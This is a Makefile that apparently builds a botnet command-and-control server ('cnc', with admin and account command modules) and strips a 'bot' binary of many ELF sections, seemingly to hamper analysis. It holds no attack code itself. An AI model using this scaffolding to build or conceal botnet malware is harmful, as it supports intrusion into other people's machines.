.PHONY: dependencies build

dependencies:
	sudo apt install git gcc -y
	git clone https://github.com/algo1337/clibplus.git
	cd clibplus; make

build:
	gcc cnc.c -o cnc \
	src/*.c \
	src/db/*.c \
	-O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections \
	-lclib+ -lssl -lcrypto -lpthread \
	-g -g3 -ggdb

count:
	wc -l *.c \
	wc -l src/*.c \
	wc -l src/db/*.c \
	wc -l commands/normal/*.c \
	wc -l commands/admin/*.c \
	wc -l commands/account/*.c \
	wc -l headers/*.h


build_bot:
	strip bot -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr